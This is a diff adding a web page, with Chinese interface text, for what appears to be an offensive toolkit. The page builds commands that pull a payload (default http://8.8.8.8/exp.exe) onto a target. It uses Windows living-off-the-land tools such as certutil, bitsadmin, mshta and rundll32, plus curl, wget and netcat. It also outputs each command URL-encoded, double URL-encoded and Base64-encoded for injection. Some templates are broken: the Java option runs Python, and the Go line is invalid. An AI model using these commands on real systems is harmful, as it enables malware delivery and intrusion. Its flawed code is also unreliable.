@@ -1,0 +1,832 @@
+{% extends "base.html" %}
+
+{% block content %}
+<style>
+/* 工具特定样式 */
+.fd-container {
+  display: grid;
+  grid-template-columns: minmax(280px, 320px) minmax(0, 1fr);
+  gap: 15px;
+  height: calc(100vh - 72px);
+  min-height: 560px;
+  align-items: stretch;
+  overflow: hidden;
+}
+
+.fd-sidebar {
+  min-width: 0;
+  min-height: 0;
+  background: var(--bg-card);
+  border-radius: 8px;
+  border: 1px solid var(--border-card);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.filter-section {
+  flex: 0 0 auto;
+  padding: 15px 15px 10px;
+  background: var(--bg-card);
+  border-bottom: 1px solid var(--border-card);
+  z-index: 2;
+}
+
+.filter-section h3 {
+  color: var(--text-strong);
+  margin-bottom: 10px;
+  font-size: 1rem;
+}
+
+.search-box {
+  width: 100%;
+  padding: 8px;
+  background: var(--bg-input);
+  border: 1px solid var(--border-mid);
+  border-radius: 8px;
+  color: var(--text-strong);
+  margin-bottom: 10px;
+}
+
+.filter-buttons {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 12px;
+  flex-wrap: wrap;
+}
+
+.filter-buttons button {
+  padding: 5px 10px;
+  background: #e9ecef;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  color: #495057;
+  cursor: pointer;
+  font-size: 0.85rem;
+}
+
+.filter-buttons button:hover {
+  background: #dee2e6;
+}
+
+.filter-buttons button.active {
+  background: #00e5ff;
+  color: #fff;
+  border-color: #00e5ff;
+}
+
+.command-list {
+  flex: 1;
+  min-height: 0;
+  overflow-y: auto;
+  list-style: none;
+  padding: 10px;
+  margin: 0;
+  scrollbar-gutter: stable;
+}
+
+.command-item {
+  padding: 10px;
+  background: var(--bg-input);
+  border: 1px solid var(--border-card);
+  border-radius: 8px;
+  margin-bottom: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.command-item:hover {
+  border-color: #00e5ff;
+}
+
+.command-name {
+  font-weight: bold;
+  color: var(--acc-text);
+  font-size: 0.9rem;
+}
+
+.command-actions {
+  float: right;
+}
+
+.command-actions button {
+  padding: 3px 8px;
+  background: #00e5ff;
+  border: none;
+  border-radius: 8px;
+  color: #fff;
+  cursor: pointer;
+  font-size: 0.75rem;
+}
+
+.command-os {
+  font-size: 0.8rem;
+  color: #f97316;
+  margin: 3px 0;
+}
+
+.command-desc {
+  font-size: 0.85rem;
+  color: var(--text-dim);
+}
+
+.fd-main-content {
+  min-width: 0;
+  min-height: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  overflow-y: auto;
+  scrollbar-gutter: stable;
+  padding-right: 2px;
+}
+
+.fd-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-card);
+  border-radius: 8px;
+  padding: 15px;
+}
+
+.fd-card h2 {
+  color: #00e5ff;
+  margin-bottom: 12px;
+  font-size: 1.1rem;
+}
+
+.config-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 12px;
+  margin-bottom: 12px;
+}
+
+.config-item {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.config-item label {
+  font-size: 0.9rem;
+  color: #00e5ff;
+  font-weight: 500;
+}
+
+.config-item input, .config-item select {
+  padding: 8px;
+  background: #f8f9fa;
+  border: 1px solid #00e5ff;
+  border-radius: 8px;
+  color: #333;
+}
+
+.action-buttons {
+  display: flex;
+  gap: 8px;
+}
+
+.btn {
+  padding: 8px 14px;
+  border: none;
+  border-radius: 8px;
+  font-weight: 600;
+  cursor: pointer;
+  font-size: 0.9rem;
+}
+
+.btn-primary {
+  background: #00e5ff;
+  color: #fff;
+}
+
+.btn-secondary {
+  background: transparent;
+  border: 1px solid #00e5ff;
+  color: #00e5ff;
+}
+
+.server-generator {
+  margin-top: 15px;
+  padding-top: 12px;
+  border-top: 1px solid #dee2e6;
+}
+
+.server-generator h3 {
+  color: #b967ff;
+  margin-bottom: 10px;
+  font-size: 1rem;
+}
+
+.server-buttons {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin-bottom: 12px;
+}
+
+.server-buttons button {
+  padding: 6px 10px;
+  background: var(--bg-input);
+  border: 1px solid var(--border-mid);
+  border-radius: 8px;
+  color: var(--text-normal);
+  cursor: pointer;
+  font-size: 0.8rem;
+}
+
+.server-buttons button:hover:not(.active) {
+  background: var(--bg-hover);
+  border-color: var(--border-btn-hover);
+  color: var(--text-strong);
+}
+
+.server-output-panel {
+  margin-top: 15px;
+  background: #fff;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  padding: 12px;
+}
+
+.server-output-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.server-output-header h3 {
+  color: #b967ff;
+  margin: 0;
+  font-size: 1rem;
+}
+
+.server-output-tabs {
+  display: flex;
+  margin-bottom: 12px;
+  background: #f8f9fa;
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.server-output-tab {
+  padding: 8px 12px;
+  background: transparent;
+  border: none;
+  color: #495057;
+  cursor: pointer;
+  font-size: 0.85rem;
+}
+
+.server-output-tab.active {
+  background: #00e5ff;
+  color: #fff;
+}
+
+.server-output-content-box {
+  display: none;
+}
+
+.server-output-content-box.active {
+  display: block;
+}
+
+.server-output-content {
+  background: #1a1a2e;
+  border: 1px solid #00e5ff;
+  border-radius: 8px;
+  padding: 12px;
+  min-height: 80px;
+  font-family: monospace;
+  font-size: 0.9rem;
+  color: #e6e6e6;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+
+.output-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.output-header h2 {
+  margin: 0;
+}
+
+.tabs {
+  display: flex;
+  margin-bottom: 12px;
+  background: #f8f9fa;
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.tab {
+  padding: 8px 12px;
+  background: transparent;
+  border: none;
+  color: #495057;
+  cursor: pointer;
+  font-size: 0.85rem;
+}
+
+.tab.active {
+  background: #00e5ff;
+  color: #fff;
+}
+
+.tab-content {
+  display: none;
+}
+
+.tab-content.active {
+  display: block;
+}
+
+.output-content {
+  background: #1a1a2e;
+  border: 1px solid #00e5ff;
+  border-radius: 8px;
+  padding: 12px;
+  min-height: 80px;
+  font-family: monospace;
+  font-size: 0.9rem;
+  color: #e6e6e6;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+
+#toast {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  padding: 10px 15px;
+  border-radius: 8px;
+  display: none;
+  z-index: 1000;
+}
+
+#toast.success {
+  border-left: 4px solid #00e5ff;
+  background: rgba(0,229,255, 0.15);
+  color: #00e5ff;
+}
+
+textarea#txt {
+  position: fixed;
+  left: -100%;
+}
+
+@media (max-width: 900px) {
+  .fd-container {
+    display: flex;
+    flex-direction: column;
+    height: auto;
+    min-height: 0;
+    overflow: visible;
+  }
+
+  .fd-sidebar {
+    width: 100%;
+    height: min(460px, 60vh);
+    min-height: 340px;
+  }
+
+  .fd-main-content {
+    overflow: visible;
+    padding-right: 0;
+  }
+}
+</style>
+
+<div class="container-fluid py-3">
+  <div class="fd-container">
+    <!-- 侧边栏 -->
+    <div class="fd-sidebar">
+      <div class="filter-section">
+        <h3>命令筛选</h3>
+        <input type="text" class="search-box" placeholder="搜索命令..." oninput="filterCommands(this.value)">
+        <div class="filter-buttons">
+          <button class="active" onclick="setFilter('all')">全部</button>
+          <button onclick="setFilter('windows')">Windows</button>
+          <button onclick="setFilter('linux')">Linux</button>
+          <button onclick="setFilter('cross')">跨平台</button>
+          <button onclick="setFilter('server')">Web服务</button>
+        </div>
+      </div>
+      <ul class="command-list" id="commandList"></ul>
+    </div>
+
+    <!-- 主内容 -->
+    <div class="fd-main-content">
+      <!-- 下载参数配置 -->
+      <div class="fd-card">
+        <h2>配置下载参数</h2>
+        <div class="config-grid">
+          <div class="config-item">
+            <label for="targetUrl">URL地址</label>
+            <input type="text" id="targetUrl" value="http://8.8.8.8/exp.exe" placeholder="输入文件URL" oninput="generateCommand()">
+          </div>
+          <div class="config-item">
+            <label for="fileName">保存文件名</label>
+            <input type="text" id="fileName" value="exploit.exe" placeholder="输入文件名" oninput="generateCommand()">
+          </div>
+          <div class="config-item">
+            <label for="port">端口号 (Web服务)</label>
+            <input type="text" id="port" value="8080" placeholder="输入端口号">
+          </div>
+        </div>
+
+        <!-- Web服务生成器 -->
+        <div class="server-generator">
+          <h3>Web服务生成器</h3>
+          <div class="server-buttons">
+            <button type="button" onclick="generateWebServer('python2', this)">Python2 HTTP</button>
+            <button type="button" onclick="generateWebServer('python3', this)">Python3 HTTP</button>
+            <button type="button" onclick="generateWebServer('python-ftp', this)">Python FTP</button>
+            <button type="button" onclick="generateWebServer('python-smb', this)">Python3 SMB</button>
+            <button type="button" onclick="generateWebServer('php', this)">PHP Server</button>
+            <button type="button" onclick="generateWebServer('ruby', this)">Ruby Server</button>
+            <button type="button" onclick="generateWebServer('node', this)">Node.js HTTP</button>
+            <button type="button" onclick="generateWebServer('java', this)">Java HTTP</button>
+            <button type="button" onclick="generateWebServer('go', this)">Go HTTP</button>
+            <button type="button" onclick="generateWebServer('busybox', this)">Busybox httpd</button>
+          </div>
+
+          <div class="server-output-panel">
+            <div class="server-output-header">
+              <h3>生成的Web服务命令</h3>
+              <button class="btn btn-primary" onclick="copyServerCommand()"><i class="bi bi-clipboard" title="复制命令"></i></button>
+            </div>
+            <div class="server-output-tabs">
+              <button class="server-output-tab active" onclick="switchServerTab('original')">原始命令</button>
+              <button class="server-output-tab" onclick="switchServerTab('url')">URL编码</button>
+              <button class="server-output-tab" onclick="switchServerTab('base64')">Base64编码</button>
+            </div>
+
+            <div id="server-original" class="server-output-content-box active">
+              <div class="server-output-content" id="serverOutputOriginal">// 点击上方按钮生成Web服务命令</div>
+            </div>
+
+            <div id="server-url" class="server-output-content-box">
+              <div class="server-output-content" id="serverOutputUrl">// URL编码命令</div>
+            </div>
+
+            <div id="server-base64" class="server-output-content-box">
+              <div class="server-output-content" id="serverOutputBase64">// Base64编码命令</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 下载命令输出面板 -->
+      <div class="fd-card">
+        <div class="output-header">
+          <h2>生成的命令</h2>
+          <button class="btn btn-primary" onclick="copyCommand()"><i class="bi bi-clipboard" title="复制命令"></i></button>
+        </div>
+        <div class="tabs">
+          <button class="tab active" onclick="switchTab('original')">原始命令</button>
+          <button class="tab" onclick="switchTab('url')">URL编码</button>
+          <button class="tab" onclick="switchTab('doubleUrl')">URL二次编码</button>
+          <button class="tab" onclick="switchTab('base64')">Base64编码</button>
+        </div>
+
+        <div id="original" class="tab-content active">
+          <div class="output-content" id="outputOriginal">// 原始命令将显示在这里</div>
+        </div>
+        <div id="url" class="tab-content">
+          <div class="output-content" id="outputUrl">// URL编码命令将显示在这里</div>
+        </div>
+        <div id="doubleUrl" class="tab-content">
+          <div class="output-content" id="outputDoubleUrl">// URL二次编码命令将显示在这里</div>
+        </div>
+        <div id="base64" class="tab-content">
+          <div class="output-content" id="outputBase64">// Base64编码命令将显示在这里</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<textarea id="txt"></textarea>
+<div id="toast"></div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+/* ==========  数据区  ========== */
+const commandData = [
+  { id: 1, name: "Python2 HTTP Server", os: "cross", desc: "使用Python2启动HTTP服务器", type: "server" },
+  { id: 2, name: "Python3 HTTP Server", os: "cross", desc: "使用Python3启动HTTP服务器", type: "server" },
+  { id: 3, name: "Python FTP Server", os: "cross", desc: "使用Python启动FTP服务器", type: "server" },
+  { id: 4, name: "Python3 SMB", os: "cross", desc: "使用Python启动SMB服务器", type: "server" },
+  { id: 5, name: "PHP 5.4+", os: "cross", desc: "使用PHP内置服务器", type: "server" },
+  { id: 6, name: "Ruby HTTP Server1", os: "cross", desc: "使用Ruby启动HTTP服务器", type: "server" },
+  { id: 7, name: "Ruby HTTP Server2", os: "cross", desc: "使用Ruby另一种方式启动HTTP服务器", type: "server" },
+  { id: 8, name: "Perl HTTP Server1", os: "cross", desc: "使用Perl启动HTTP服务器", type: "server" },
+  { id: 9, name: "Perl HTTP Server2", os: "cross", desc: "使用Perl另一种方式启动HTTP服务器", type: "server" },
+  { id: 10, name: "Busybox httpd", os: "linux", desc: "使用Busybox的httpd", type: "server" },
+  { id: 11, name: "NC下载", os: "linux", desc: "使用Netcat进行文件下载", type: "download" },
+  { id: 12, name: "TFTP", os: "linux", desc: "使用TFTP协议下载文件", type: "download" },
+  { id: 13, name: "Linux wget", os: "linux", desc: "使用wget下载文件", type: "download" },
+  { id: 14, name: "Linux curl", os: "linux", desc: "使用curl下载文件", type: "download" },
+  { id: 15, name: "PowerShell - IWR(Windows)", os: "windows", desc: "使用PowerShell的Invoke-WebRequest", type: "download" },
+  { id: 16, name: "PowerShell - IEX(Windows)", os: "windows", desc: "使用PowerShell的Invoke-Expression", type: "download" },
+  { id: 17, name: "Windows Certutil", os: "windows", desc: "使用Windows certutil工具", type: "download" },
+  { id: 18, name: "Windows Bitsadmin Down", os: "windows", desc: "使用Windows bitsadmin download", type: "download" },
+  { id: 19, name: "Windows Bitsadmin Getfile", os: "windows", desc: "使用Windows bitsadmin getfile", type: "download" },
+  { id: 20, name: "Windows msiexec", os: "windows", desc: "使用Windows msiexec工具", type: "download" },
+  { id: 21, name: "Windows IPC$", os: "windows", desc: "使用Windows IPC共享", type: "download" },
+  { id: 22, name: "Windows SMB", os: "windows", desc: "使用SMB协议下载文件", type: "download" },
+  { id: 23, name: "Windows VBS", os: "windows", desc: "使用VBScript下载文件", type: "download" },
+  { id: 24, name: "JScript", os: "windows", desc: "使用JScript下载文件", type: "download" },
+  { id: 25, name: "JScript+Rundll32", os: "windows", desc: "使用JScript和Rundll32下载文件", type: "download" },
+  { id: 26, name: "Window文件共享", os: "windows", desc: "使用Windows文件共享下载", type: "download" }
+];
+
+const commandTemplates = {
+  1: "python -m SimpleHTTPServer {port}",
+  2: "python3 -m http.server {port}",
+  3: "python -m pyftpdlib -p {port}",
+  4: "python3 -m impacket.smbserver -port {port} share .",
+  5: "php -S {host}:{port}",
+  6: "ruby -run -ehttpd . -p{port}",
+  7: "ruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port => {port}, :DocumentRoot => Dir.pwd).start\"",
+  8: "perl -MHTTP::Server::Brick -e \"$s=HTTP::Server::Brick->new(port=>{port}); $s->mount('/'=>{path=>'.'}); $s->start\"",
+  9: "plackup -MPlack::App::Directory -e \"Plack::App::Directory->new(root=>'.')->to_app\" -p {port}",
+  10: "busybox httpd -f -p {port}",
+  11: "nc -lvnp {port} > {file}",
+  12: "tftp -i {host} GET {file}",
+  13: "wget {url} -O {file}",
+  14: "curl {url} -o {file}",
+  15: "powershell -Command \"Invoke-WebRequest -Uri '{url}' -OutFile '{file}'\"",
+  16: "powershell -Command \"IEX(New-Object Net.WebClient).DownloadFile('{url}', '{file}')\"",
+  17: "certutil -urlcache -split -f {url} {file}",
+  18: "bitsadmin /rawreturn /transfer down {url} C:\\{file}",
+  19: "bitsadmin /transfer getfile /download /priority normal {url} C:\\{file}",
+  20: "msiexec /q /i {url}",
+  21: "copy \\\\{host}\\c$\\{path} C:\\{file}",
+  22: "copy \\\\{host}\\share\\{file} C:\\{file}",
+  23: "mshta vbscript:Execute(\"CreateObject(\\\"WScript.Shell\\\").Run \\\"cmd /c curl -o C:\\{file} {url}\\\",0,true:close\")",
+  24: "cscript //nologo //e:jscript \"%TEMP%\\dl.js\" && move /y \"%TEMP%\\{file}\" C:\\",
+  25: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c curl -o C:\\{file} {url}\",0,true);close();",
+  26: "net use z: \\\\{host}\\share & copy z:\\{file} C:\\ & net use z: /delete"
+};
+
+const webServerTemplates = {
+  python2: "python -m SimpleHTTPServer {port}",
+  python3: "python3 -m http.server {port}",
+  'python-ftp': "python -m pyftpdlib -p {port}",
+  'python-smb': "python3 -m impacket.smbserver -port {port} share .",
+  php: "php -S 0.0.0.0:{port}",
+  ruby: "ruby -run -ehttpd . -p{port}",
+  node: "npx http-server -p {port}",
+  java: "python -c \"import http.server, socketserver; Handler = http.server.SimpleHTTPRequestHandler; httpd = socketserver.TCPServer(('', {port}), Handler); httpd.serve_forever()\"",
+  go: "go run -exec \"http.ListenAndServe(':{port}', http.FileServer(http.Dir('.')))\"",
+  busybox: "busybox httpd -f -p {port}"
+};
+
+let serverCommandCache = '';
+let currentDownloadCommand = '';
+let currentServerCommand = '';
+
+/* ==========  初始化  ========== */
+function initPage() {
+  renderCommandList();
+  generateCommand();
+}
+
+/* ==========  左侧命令列表  ========== */
+function renderCommandList(filter = 'all') {
+  const ul = document.getElementById('commandList');
+  ul.innerHTML = '';
+  const list = filter === 'all'
+    ? commandData
+    : commandData.filter(cmd => filter === 'server' ? cmd.type === 'server' : cmd.os === filter);
+  list.forEach(cmd => {
+    const li = document.createElement('li');
+    li.className = 'command-item';
+    li.onclick = () => applyCommand(cmd.id);
+    li.innerHTML = `
+      <div>
+        <span class="command-name">${cmd.name}</span>
+        <div class="command-actions">
+          <button onclick="event.stopPropagation(); applyCommand(${cmd.id})">应用</button>
+        </div>
+      </div>
+      <div class="command-os">${getOSLabel(cmd.os)} - ${getTypeLabel(cmd.type)}</div>
+      <div class="command-desc">${cmd.desc}</div>`;
+    ul.appendChild(li);
+  });
+}
+function getOSLabel(os) {
+  switch (os) {
+    case 'windows': return 'Windows';
+    case 'linux': return 'Linux';
+    case 'cross': return '跨平台';
+    default: return os;
+  }
+}
+function getTypeLabel(type) {
+  switch (type) {
+    case 'server': return '服务';
+    case 'download': return '下载';
+    default: return type;
+  }
+}
+function setFilter(filter) {
+  document.querySelectorAll('.filter-buttons button').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+  renderCommandList(filter);
+}
+function filterCommands(q) {
+  const list = commandData.filter(cmd =>
+    cmd.name.toLowerCase().includes(q.toLowerCase()) ||
+    cmd.desc.toLowerCase().includes(q.toLowerCase())
+  );
+  const ul = document.getElementById('commandList');
+  ul.innerHTML = '';
+  list.forEach(cmd => {
+    const li = document.createElement('li');
+    li.className = 'command-item';
+    li.onclick = () => applyCommand(cmd.id);
+    li.innerHTML = `
+      <div>
+        <span class="command-name">${cmd.name}</span>
+        <div class="command-actions">
+          <button onclick="event.stopPropagation(); applyCommand(${cmd.id})">应用</button>
+        </div>
+      </div>
+      <div class="command-os">${getOSLabel(cmd.os)} - ${getTypeLabel(cmd.type)}</div>
+      <div class="command-desc">${cmd.desc}</div>`;
+    ul.appendChild(li);
+  });
+}
+
+/* ==========  下载命令生成  ========== */
+function applyCommand(id) {
+  const cmd = commandData.find(c => c.id === id);
+  if (!cmd) return;
+
+  if (cmd.type === 'server') {
+    generateSpecificServerCommand(id);
+    showToast(`已应用: ${cmd.name} (Web服务)`);
+  } else {
+    generateSpecificCommand(id);
+    showToast(`已应用: ${cmd.name} (下载)`);
+  }
+}
+
+function generateSpecificCommand(id) {
+  const url = document.getElementById('targetUrl').value;
+  const file = document.getElementById('fileName').value;
+  const port = document.getElementById('port').value;
+  let host = '8.8.8.8', path = '/exp.exe';
+  try {
+    const u = new URL(url);
+    host = u.hostname;
+    path = u.pathname;
+  } catch {}
+  let cmd = commandTemplates[id]
+    .replace(/{url}/g, url)
+    .replace(/{file}/g, file)
+    .replace(/{host}/g, host)
+    .replace(/{port}/g, port)
+    .replace(/{path}/g, path);
+
+  currentDownloadCommand = cmd;
+  displayAllEncodings(cmd);
+}
+
+function generateSpecificServerCommand(id) {
+  const port = document.getElementById('port').value;
+  let host = '0.0.0.0';
+  let cmd = commandTemplates[id]
+    .replace(/{host}/g, host)
+    .replace(/{port}/g, port);
+
+  currentServerCommand = cmd;
+  displayServerEncodings(cmd);
+}
+
+function generateCommand() {
+  const url = document.getElementById('targetUrl').value;
+  const file = document.getElementById('fileName').value;
+  if (!url) return;
+  let cmd;
+  try {
+    const u = new URL(url);
+    cmd = u.protocol === 'https:' ? `curl -k "${url}" -o "${file}"` : `curl "${url}" -o "${file}"`;
+  } catch {
+    cmd = `wget "${url}" -O "${file}"`;
+  }
+
+  currentDownloadCommand = cmd;
+  displayAllEncodings(cmd);
+}
+
+function displayAllEncodings(cmd) {
+  document.getElementById('outputOriginal').textContent = cmd;
+  document.getElementById('outputUrl').textContent = encodeURIComponent(cmd);
+  document.getElementById('outputDoubleUrl').textContent = encodeURIComponent(encodeURIComponent(cmd));
+  document.getElementById('outputBase64').textContent = btoa(unescape(encodeURIComponent(cmd)));
+}
+
+/* ==========  Web服务生成器  ========== */
+function generateWebServer(type, selectedButton) {
+  const port = document.getElementById('port').value || '8080';
+  const cmd = (webServerTemplates[type] || '').replace(/{port}/g, port);
+  if (!cmd) return;
+
+  document.querySelectorAll('.server-buttons > button').forEach((button) => {
+    const isSelected = button === selectedButton;
+    button.classList.toggle('active', isSelected);
+    button.setAttribute('aria-pressed', String(isSelected));
+  });
+  currentServerCommand = cmd;
+  displayServerEncodings(cmd);
+  showToast(`已生成 ${type} Web服务命令`);
+}
+
+function displayServerEncodings(cmd) {
+  document.getElementById('serverOutputOriginal').textContent = cmd;
+  document.getElementById('serverOutputUrl').textContent = encodeURIComponent(cmd);
+  document.getElementById('serverOutputBase64').textContent = btoa(unescape(encodeURIComponent(cmd)));
+}
+
+function switchServerTab(tab) {
+  document.querySelectorAll('.server-output-tab').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.server-output-content-box').forEach(p => p.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById(`server-${tab}`).classList.add('active');
+}
+
+function copyServerCommand() {
+  const activeTab = document.querySelector('.server-output-tab.active');
+  if (!activeTab) return;
+
+  const tabType = activeTab.textContent.toLowerCase();
+  let content = '';
+
+  if (tabType.includes('原始')) {
+    content = document.getElementById('serverOutputOriginal').textContent;
+  } else if (tabType.includes('url')) {
+    content = document.getElementById('serverOutputUrl').textContent;
+  } else if (tabType.includes('base64')) {
+    content = document.getElementById('serverOutputBase64').textContent;
+  }
+
+  const ta = document.getElementById('txt');
+  ta.value = content;
+  ta.select();
+  document.execCommand('copy');
+  showToast('Web服务命令已复制');
+}
+
+/* ==========  公用交互  ========== */
+function switchTab(tab) {
+  document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById(tab).classList.add('active');
+}
+
+function copyCommand() {
+  const activeTab = document.querySelector('.tab.active');
+  if (!activeTab) return;
+
+  const tabId = activeTab.id;
+  let content = '';
+
+  if (tabId === 'original') {
+    content = document.getElementById('outputOriginal').textContent;
+  } else if (tabId === 'url') {
+    content = document.getElementById('outputUrl').textContent;
+  } else if (tabId === 'doubleUrl') {
+    content = document.getElementById('outputDoubleUrl').textContent;
+  } else if (tabId === 'base64') {
+    content = document.getElementById('outputBase64').textContent;
+  }
+
+  const ta = document.getElementById('txt');
+  ta.value = content;
+  ta.select();
+  document.execCommand('copy');
+  showToast('命令已复制到剪贴板');
+}
+
+function showToast(msg) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.className = 'success';
+  toast.style.display = 'block';
+  setTimeout(() => toast.style.display = 'none', 2000);
+}
+
+initPage();
+</script>
+{% endblock %}
